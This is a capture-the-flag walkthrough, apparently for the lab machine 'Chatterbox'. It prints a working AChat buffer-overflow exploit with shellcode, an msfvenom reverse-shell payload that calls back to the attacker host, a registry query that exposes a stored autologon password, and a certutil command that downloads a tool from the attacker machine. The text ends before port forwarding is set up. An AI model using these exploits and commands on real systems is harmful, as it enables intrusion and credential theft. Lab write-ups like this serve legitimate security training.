# Walkthrough

```bash
nmap -T4 -sV -sC -p- -oN nmap/initial 10.10.10.74
Nmap 7.91 scan initiated Sun Feb 21 22:18:23 2021 as: nmap -T4 -sV -sC -p- -oN nmap/initial 10.10.10.74
Nmap scan report for 10.10.10.74
Host is up (0.13s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE VERSION
9255/tcp open  http    AChat chat system httpd
|_http-server-header: AChat
|_http-title: Site doesn't have a title.
9256/tcp open  achat   AChat chat system

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 21 22:23:49 2021 -- 1 IP address (1 host up) scanned in 326.38 seconds
```

We don't have much information about the target so let's search a exploit.

```bash
searchsploit Achat
---------------------------------------------------- ---------------------------------
 Exploit Title                                      |  Path
---------------------------------------------------- ---------------------------------
Achat 0.150 beta7 - Remote Buffer Overflow          | windows/remote/36025.py
Achat 0.150 beta7 - Remote Buffer Overflow (Metaspl | windows/remote/36056.rb
MataChat - 'input.php' Multiple Cross-Site Scriptin | php/webapps/32958.txt
Parachat 5.5 - Directory Traversal                  | php/webapps/24647.txt
---------------------------------------------------- ---------------------------------
```

It seems we can try a buffer overflow, let's read the python code.

```python
root@kali:/usr/share/exploitdb/exploits/windows/remote# cat 36025.py 
#!/usr/bin/python
# Author KAhara MAnhara
# Achat 0.150 beta7 - Buffer Overflow
# Tested on Windows 7 32bit

import socket
import sys, time

# msfvenom -a x86 --platform Windows -p windows/exec CMD=calc.exe -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
#Payload size: 512 bytes

buf =  ""
buf += "\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
buf += "\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += "\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
buf += "\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
buf += "\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
buf += "\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
buf += "\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
buf += "\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
buf += "\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
buf += "\x47\x42\x39\x75\x34\x4a\x42\x69\x6c\x77\x78\x62\x62"
buf += "\x69\x70\x59\x70\x4b\x50\x73\x30\x43\x59\x5a\x45\x50"
buf += "\x31\x67\x50\x4f\x74\x34\x4b\x50\x50\x4e\x50\x34\x4b"
buf += "\x30\x52\x7a\x6c\x74\x4b\x70\x52\x4e\x34\x64\x4b\x63"
buf += "\x42\x4f\x38\x4a\x6f\x38\x37\x6d\x7a\x4d\x56\x4d\x61"
buf += "\x49\x6f\x74\x6c\x4f\x4c\x6f\x71\x33\x4c\x69\x72\x4e"
buf += "\x4c\x4f\x30\x66\x61\x58\x4f\x5a\x6d\x59\x71\x67\x57"
buf += "\x68\x62\x48\x72\x52\x32\x50\x57\x54\x4b\x72\x32\x4e"
buf += "\x30\x64\x4b\x6e\x6a\x4d\x6c\x72\x6b\x70\x4c\x4a\x71"
buf += "\x43\x48\x39\x53\x71\x38\x6a\x61\x36\x71\x4f\x61\x62"
buf += "\x6b\x42\x39\x4f\x30\x4a\x61\x38\x53\x62\x6b\x30\x49"
buf += "\x6b\x68\x58\x63\x4e\x5a\x6e\x69\x44\x4b\x6f\x44\x72"
buf += "\x6b\x4b\x51\x36\x76\x70\x31\x69\x6f\x46\x4c\x57\x51"
buf += "\x48\x4f\x4c\x4d\x6a\x61\x55\x77\x4f\x48\x57\x70\x54"
buf += "\x35\x49\x66\x49\x73\x51\x6d\x7a\x58\x6d\x6b\x53\x4d"
buf += "\x4e\x44\x34\x35\x38\x64\x62\x38\x62\x6b\x52\x38\x6b"
buf += "\x74\x69\x71\x4a\x33\x33\x36\x54\x4b\x7a\x6c\x6e\x6b"
buf += "\x72\x6b\x51\x48\x6d\x4c\x6b\x51\x67\x63\x52\x6b\x49"
buf += "\x74\x72\x6b\x4d\x31\x7a\x30\x44\x49\x51\x34\x6e\x44"
buf += "\x4b\x74\x61\x4b\x51\x4b\x4f\x71\x51\x49\x71\x4a\x52"
buf += "\x31\x49\x6f\x69\x50\x31\x4f\x51\x4f\x6e\x7a\x34\x4b"
buf += "\x6a\x72\x38\x6b\x44\x4d\x71\x4d\x50\x6a\x59\x71\x64"
buf += "\x4d\x35\x35\x65\x62\x4b\x50\x49\x70\x4b\x50\x52\x30"
buf += "\x32\x48\x6c\x71\x64\x4b\x72\x4f\x51\x77\x59\x6f\x79"
buf += "\x45\x45\x6b\x48\x70\x75\x65\x35\x52\x30\x56\x72\x48"
buf += "\x33\x76\x35\x45\x37\x4d\x63\x6d\x49\x6f\x37\x65\x6d"
buf += "\x6c\x6a\x66\x31\x6c\x79\x7a\x51\x70\x4b\x4b\x67\x70"
buf += "\x53\x45\x6d\x35\x55\x6b\x31\x37\x4e\x33\x32\x52\x30"
buf += "\x6f\x42\x4a\x6d\x30\x50\x53\x79\x6f\x37\x65\x70\x63"
buf += "\x53\x31\x72\x4c\x30\x63\x4c\x6e\x70\x65\x32\x58\x50"
buf += "\x65\x6d\x30\x41\x41"

# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_address = ('192.168.91.130', 9256)

fs = "\x55\x2A\x55\x6E\x58\x6E\x05\x14\x11\x6E\x2D\x13\x11\x6E\x50\x6E\x58\x43\x59\x39"
p  = "A0000000002#Main" + "\x00" + "Z"*114688 + "\x00" + "A"*10 + "\x00"
p += "A0000000002#Main" + "\x00" + "A"*57288 + "AAAAASI"*50 + "A"*(3750-46)
p += "\x62" + "A"*45
p += "\x61\x40" 
p += "\x2A\x46"
p += "\x43\x55\x6E\x58\x6E\x2A\x2A\x05\x14\x11\x43\x2d\x13\x11\x43\x50\x43\x5D" + "C"*9 + "\x60\x43"
p += "\x61\x43" + "\x2A\x46"
p += "\x2A" + fs + "C" * (157-len(fs)- 31-3)
p += buf + "A" * (1152 - len(buf))
p += "\x00" + "A"*10 + "\x00"

print "---->{P00F}!"
i=0
while i<len(p):
    if i > 172000:
        time.sleep(1.0)
    sent = sock.sendto(p[i:(i+8192)], server_address)
    i += sent
sock.close()
```

With this python script we have a simple buffer overflow. The program use a msfvenom payload for windows, executing the calculator where the input is gonna be the encrypted hex, producing the buffer overflow.

I'm going to change this because i want a reverse shell, so let's create it on my kali machine so i can change the code.

```bash
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

```bash
root@kali:~/HTB/Chatterbox/exploit# msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python 
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/unicode_mixed
x86/unicode_mixed succeeded with size 834 (iteration=0)
x86/unicode_mixed chosen with final size 834
Payload size: 834 bytes
Final size of python file: 4062 bytes
buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
buf += b"\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
buf += b"\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
buf += b"\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
buf += b"\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
buf += b"\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
buf += b"\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
buf += b"\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
buf += b"\x47\x42\x39\x75\x34\x4a\x42\x69\x6c\x6a\x48\x44\x42"
buf += b"\x6d\x30\x4b\x50\x39\x70\x53\x30\x62\x69\x39\x55\x6c"
buf += b"\x71\x45\x70\x70\x64\x62\x6b\x62\x30\x50\x30\x42\x6b"
buf += b"\x32\x32\x6a\x6c\x44\x4b\x52\x32\x4e\x34\x74\x4b\x34"
buf += b"\x32\x6d\x58\x6a\x6f\x66\x57\x4e\x6a\x4b\x76\x4c\x71"
buf += b"\x49\x6f\x36\x4c\x4d\x6c\x73\x31\x53\x4c\x6a\x62\x4e"
buf += b"\x4c\x6b\x70\x69\x31\x46\x6f\x4c\x4d\x59\x71\x46\x67"
buf += b"\x79\x52\x79\x62\x72\x32\x51\x47\x64\x4b\x6e\x72\x4e"
buf += b"\x30\x72\x6b\x30\x4a\x6f\x4c\x32\x6b\x4e\x6c\x4a\x71"
buf += b"\x63\x48\x78\x63\x4e\x68\x79\x71\x38\x51\x50\x51\x74"
buf += b"\x4b\x31\x49\x4d\x50\x49\x71\x39\x43\x54\x4b\x4f\x59"
buf += b"\x6a\x78\x49\x53\x4e\x5a\x4d\x79\x42\x6b\x30\x34\x52"
buf += b"\x6b\x59\x71\x46\x76\x6e\x51\x59\x6f\x56\x4c\x47\x51"
buf += b"\x46\x6f\x5a\x6d\x6b\x51\x77\x57\x6e\x58\x67\x70\x54"
buf += b"\x35\x5a\x56\x6a\x63\x51\x6d\x39\x68\x6d\x6b\x73\x4d"
buf += b"\x6b\x74\x70\x75\x77\x74\x72\x38\x54\x4b\x42\x38\x4d"
buf += b"\x54\x79\x71\x37\x63\x31\x56\x62\x6b\x7a\x6c\x70\x4b"
buf += b"\x62\x6b\x4e\x78\x6d\x4c\x6d\x31\x36\x73\x54\x4b\x6d"
buf += b"\x34\x62\x6b\x5a\x61\x5a\x30\x32\x69\x50\x44\x4c\x64"
buf += b"\x4e\x44\x71\x4b\x61\x4b\x50\x61\x50\x59\x70\x5a\x62"
buf += b"\x31\x79\x6f\x49\x50\x51\x4f\x51\x4f\x6f\x6a\x72\x6b"
buf += b"\x4c\x52\x48\x6b\x34\x4d\x51\x4d\x53\x38\x4c\x73\x50"
buf += b"\x32\x4d\x30\x4b\x50\x72\x48\x73\x47\x30\x73\x4d\x62"
buf += b"\x6f\x6f\x6e\x74\x31\x58\x50\x4c\x63\x47\x4c\x66\x49"
buf += b"\x77\x49\x6f\x37\x65\x65\x68\x56\x30\x79\x71\x4b\x50"
buf += b"\x6d\x30\x6b\x79\x78\x44\x31\x44\x32\x30\x50\x68\x6e"
buf += b"\x49\x75\x30\x32\x4b\x79\x70\x49\x6f\x57\x65\x70\x50"
buf += b"\x70\x50\x6e\x70\x72\x30\x71\x30\x30\x50\x4d\x70\x52"
buf += b"\x30\x71\x58\x58\x6a\x5a\x6f\x39\x4f\x39\x50\x39\x6f"
buf += b"\x37\x65\x52\x77\x72\x4a\x4c\x45\x52\x48\x4a\x6a\x4c"
buf += b"\x4a\x5a\x6e\x7a\x65\x43\x38\x4c\x42\x79\x70\x7a\x61"
buf += b"\x35\x6b\x75\x39\x77\x76\x4f\x7a\x4a\x70\x31\x46\x31"
buf += b"\x47\x62\x48\x74\x59\x76\x45\x52\x54\x43\x31\x39\x6f"
buf += b"\x69\x45\x62\x65\x67\x50\x63\x44\x7a\x6c\x59\x6f\x30"
buf += b"\x4e\x39\x78\x44\x35\x78\x6c\x6f\x78\x38\x70\x46\x55"
buf += b"\x57\x32\x4f\x66\x6b\x4f\x66\x75\x32\x48\x63\x33\x50"
buf += b"\x6d\x33\x34\x69\x70\x33\x59\x5a\x43\x71\x47\x71\x47"
buf += b"\x50\x57\x6e\x51\x79\x66\x62\x4a\x4d\x42\x62\x39\x30"
buf += b"\x56\x7a\x42\x6b\x4d\x63\x36\x78\x47\x51\x34\x4b\x74"
buf += b"\x6d\x6c\x69\x71\x4b\x51\x52\x6d\x4f\x54\x6e\x44\x4e"
buf += b"\x30\x46\x66\x4d\x30\x61\x34\x62\x34\x72\x30\x71\x46"
buf += b"\x6e\x76\x61\x46\x61\x36\x32\x36\x30\x4e\x30\x56\x50"
buf += b"\x56\x70\x53\x6f\x66\x32\x48\x50\x79\x38\x4c\x4d\x6f"
buf += b"\x65\x36\x4b\x4f\x7a\x35\x43\x59\x57\x70\x50\x4e\x50"
buf += b"\x56\x30\x46\x69\x6f\x50\x30\x50\x68\x4d\x38\x45\x37"
buf += b"\x4b\x6d\x43\x30\x39\x6f\x36\x75\x77\x4b\x38\x70\x58"
buf += b"\x35\x67\x32\x4e\x76\x33\x38\x74\x66\x63\x65\x77\x4d"
buf += b"\x35\x4d\x39\x6f\x49\x45\x4f\x4c\x7a\x66\x71\x6c\x7a"
buf += b"\x6a\x73\x50\x79\x6b\x59\x50\x31\x65\x6b\x55\x45\x6b"
buf += b"\x30\x47\x4a\x73\x44\x32\x72\x4f\x6f\x7a\x49\x70\x61"
buf += b"\x43\x79\x6f\x59\x45\x41\x41"
```

```bash
root@kali:~/HTB/Chatterbox# nc -nvlp 443
listening on [any] 443 ...
```

```bash
root@kali:~/HTB/Chatterbox/exploit# python exploit.py 
---->{P00F}!
```

```bash
root@kali:~/HTB/Chatterbox# nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.74] 49158
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

```bash
Host Name:                 CHATTERBOX
OS Name:                   Microsoft Windows 7 Professional 
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00371-222-9819843-86663
Original Install Date:     12/10/2017, 9:18:19 AM
System Boot Time:          2/21/2021, 5:47:35 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [02]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,503 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,415 MB
Virtual Memory: In Use:    680 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\CHATTERBOX
Hotfix(s):                 183 Hotfix(s) Installed.
                           [01]: KB2849697
                           [02]: KB2849696
                           [03]: KB2841134
                           [04]: KB2670838
                           [05]: KB2830477
                           [06]: KB2592687
                           [07]: KB2479943
                           [08]: KB2491683
                           [09]: KB2506212
                           [10]: KB2506928
                           [11]: KB2509553
                           [12]: KB2533552
                           [13]: KB2534111
                           [14]: KB2545698
                           [15]: KB2547666
                           [16]: KB2552343
                           [17]: KB2560656
                           [18]: KB2563227
                           [19]: KB2564958
                           [20]: KB2574819
                           [21]: KB2579686
                           [22]: KB2604115
                           [23]: KB2620704
                           [24]: KB2621440
                           [25]: KB2631813
                           [26]: KB2639308
                           [27]: KB2640148
                           [28]: KB2647753
                           [29]: KB2654428
                           [30]: KB2660075
                           [31]: KB2667402
                           [32]: KB2676562
                           [33]: KB2685811
                           [34]: KB2685813
                           [35]: KB2690533
                           [36]: KB2698365
                           [37]: KB2705219
                           [38]: KB2719857
                           [39]: KB2726535
                           [40]: KB2727528
                           [41]: KB2729094
                           [42]: KB2732059
                           [43]: KB2732487
                           [44]: KB2736422
                           [45]: KB2742599
                           [46]: KB2750841
                           [47]: KB2761217
                           [48]: KB2763523
                           [49]: KB2770660
                           [50]: KB2773072
                           [51]: KB2786081
                           [52]: KB2799926
                           [53]: KB2800095
                           [54]: KB2807986
                           [55]: KB2808679
                           [56]: KB2813430
                           [57]: KB2820331
                           [58]: KB2834140
                           [59]: KB2840631
                           [60]: KB2843630
                           [61]: KB2847927
                           [62]: KB2852386
                           [63]: KB2853952
                           [64]: KB2857650
                           [65]: KB2861698
                           [66]: KB2862152
                           [67]: KB2862330
                           [68]: KB2862335
                           [69]: KB2864202
                           [70]: KB2868038
                           [71]: KB2871997
                           [72]: KB2884256
                           [73]: KB2891804
                           [74]: KB2892074
                           [75]: KB2893294
                           [76]: KB2893519
                           [77]: KB2894844
                           [78]: KB2900986
                           [79]: KB2908783
                           [80]: KB2911501
                           [81]: KB2912390
                           [82]: KB2918077
                           [83]: KB2919469
                           [84]: KB2923545
                           [85]: KB2931356
                           [86]: KB2937610
                           [87]: KB2943357
                           [88]: KB2952664
                           [89]: KB2966583
                           [90]: KB2968294
                           [91]: KB2970228
                           [92]: KB2972100
                           [93]: KB2973112
                           [94]: KB2973201
                           [95]: KB2973351
                           [96]: KB2977292
                           [97]: KB2978742
                           [98]: KB2984972
                           [99]: KB2985461
                           [100]: KB2991963
                           [101]: KB2992611
                           [102]: KB3003743
                           [103]: KB3004361
                           [104]: KB3004375
                           [105]: KB3006121
                           [106]: KB3006137
                           [107]: KB3010788
                           [108]: KB3011780
                           [109]: KB3013531
                           [110]: KB3020370
                           [111]: KB3020388
                           [112]: KB3021674
                           [113]: KB3021917
                           [114]: KB3022777
                           [115]: KB3023215
                           [116]: KB3030377
                           [117]: KB3035126
                           [118]: KB3037574
                           [119]: KB3042058
                           [120]: KB3045685
                           [121]: KB3046017
                           [122]: KB3046269
                           [123]: KB3054476
                           [124]: KB3055642
                           [125]: KB3059317
                           [126]: KB3060716
                           [127]: KB3061518
                           [128]: KB3067903
                           [129]: KB3068708
                           [130]: KB3071756
                           [131]: KB3072305
                           [132]: KB3074543
                           [133]: KB3075226
                           [134]: KB3078601
                           [135]: KB3078667
                           [136]: KB3080149
                           [137]: KB3084135
                           [138]: KB3086255
                           [139]: KB3092627
                           [140]: KB3093513
                           [141]: KB3097989
                           [142]: KB3101722
                           [143]: KB3102429
                           [144]: KB3107998
                           [145]: KB3108371
                           [146]: KB3108381
                           [147]: KB3108664
                           [148]: KB3109103
                           [149]: KB3109560
                           [150]: KB3110329
                           [151]: KB3118401
                           [152]: KB3122648
                           [153]: KB3123479
                           [154]: KB3126587
                           [155]: KB3127220
                           [156]: KB3133977
                           [157]: KB3137061
                           [158]: KB3138378
                           [159]: KB3138612
                           [160]: KB3138910
                           [161]: KB3139398
                           [162]: KB3139914
                           [163]: KB3140245
                           [164]: KB3147071
                           [165]: KB3150220
                           [166]: KB3150513
                           [167]: KB3156016
                           [168]: KB3156019
                           [169]: KB3159398
                           [170]: KB3161102
                           [171]: KB3161949
                           [172]: KB3161958
                           [173]: KB3172605
                           [174]: KB3177467
                           [175]: KB3179573
                           [176]: KB3184143
                           [177]: KB3185319
                           [178]: KB4014596
                           [179]: KB4019990
                           [180]: KB4040980
                           [181]: KB976902
                           [182]: KB982018
                           [183]: KB4054518
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.74
```

Let's play arround with some commands looking for more interesting information.

You can check [Enumeration](https://www.notion.so/Enumeration-1e8ceb98a4424889b5df525680424c35) if you need information about what a command does.

```bash
c:\Windows\System32>net users 
net users

User accounts for \\CHATTERBOX

-------------------------------------------------------------------------------
Administrator            Alfred                   Guest                    
The command completed successfully.

c:\Windows\System32>net user Alfred
net user Alfred
User name                    Alfred
Full Name                    
Comment                      
User's comment               
Country code                 001 (United States)
Account active               Yes
Account expires              Never

Password last set            12/10/2017 9:18:08 AM
Password expires             Never
Password changeable          12/10/2017 9:18:08 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   2/21/2021 5:47:44 PM

Logon hours allowed          All

Local Group Memberships      *Users                
Global Group memberships     *None                 
The command completed successfully.
```

We have Administrator and Alfred user. The user Alfred is part of Users group, so it looks like we can't get administrator privileges with this user.

```bash
c:\Windows\System32>netstat -ano
çnetstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       700
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       360
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       764
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       912
  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       452
  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       476
  TCP    10.10.10.74:139        0.0.0.0:0              LISTENING       4
  TCP    10.10.10.74:9255       0.0.0.0:0              LISTENING       1280
  TCP    10.10.10.74:9256       0.0.0.0:0              LISTENING       1280
  TCP    10.10.10.74:49158      10.10.14.5:443         ESTABLISHED     1280
  TCP    127.0.0.1:135          127.0.0.1:49165        ESTABLISHED     700
  TCP    127.0.0.1:49165        127.0.0.1:135          ESTABLISHED     4056
  TCP    [::]:135               [::]:0                 LISTENING       700
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:49152             [::]:0                 LISTENING       360
  TCP    [::]:49153             [::]:0                 LISTENING       764
  TCP    [::]:49154             [::]:0                 LISTENING       912
  TCP    [::]:49155             [::]:0                 LISTENING       452
  TCP    [::]:49156             [::]:0                 LISTENING       476
  UDP    0.0.0.0:123            *:*                                    872
  UDP    0.0.0.0:500            *:*                                    912
  UDP    0.0.0.0:4500           *:*                                    912
  UDP    0.0.0.0:5355           *:*                                    1152
  UDP    0.0.0.0:60368          *:*                                    1152
  UDP    10.10.10.74:137        *:*                                    4
  UDP    10.10.10.74:138        *:*                                    4
  UDP    10.10.10.74:1900       *:*                                    3160
  UDP    10.10.10.74:9256       *:*                                    1280
  UDP    127.0.0.1:1900         *:*                                    3160
  UDP    127.0.0.1:54701        *:*                                    3160
  UDP    [::]:123               *:*                                    872
  UDP    [::]:500               *:*                                    912
  UDP    [::]:4500              *:*                                    912
  UDP    [::1]:1900             *:*                                    3160
  UDP    [::1]:54700            *:*                                    3160
```

Here we have interesting information. We can see that the port 445 (SMB) is open, but we didn't see that port in the nmap scan. This is because the port is only open internaly. We can attack this port if it's open publicly, but it's not the case at the moment, we will see how we can take advantage of this in a bit. Now let's continue searching for more information like the stored passwords.

```bash
c:\Windows\System32>reg query HKLM /f password /t REG_SZ /s
```

```bash
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    DefaultPassword    REG_SZ    Welcome1!
```

```bash
c:\Windows\System32>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ    
    LegalNoticeText    REG_SZ    
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    ShutdownWithoutLogon    REG_SZ    0
    WinStationsDisabled    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    scremoveoption    REG_SZ    0
    ShutdownFlags    REG_DWORD    0x80000033
    DefaultDomainName    REG_SZ    
    DefaultUserName    REG_SZ    Alfred
    AutoAdminLogon    REG_SZ    1
    DefaultPassword    REG_SZ    Welcome1!

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\GPExtensions
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\AutoLogonChecked
```

So now we know that the password we found before belongs to the user Alfred.

As we saw earlier, we can do something with port 445, the technique is called port forwarding. We are going to comunicate that port on that machine to our machine. How can we do that? We are going to use a tool called plink (a command-line interface to the PuTTY back ends) to connect from the victim machine to the attacker machine (our machine).

We are gonna put the file plink.exe on the victim's machine:

```bash
root@kali:~/HTB/Chatterbox/exploit# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

```bash
c:\Users\Alfred>certutil -urlcache -f http://10.10.14.5/plink.exe plink.exe
```

Before we execute plink.exe we need to configure our machine.
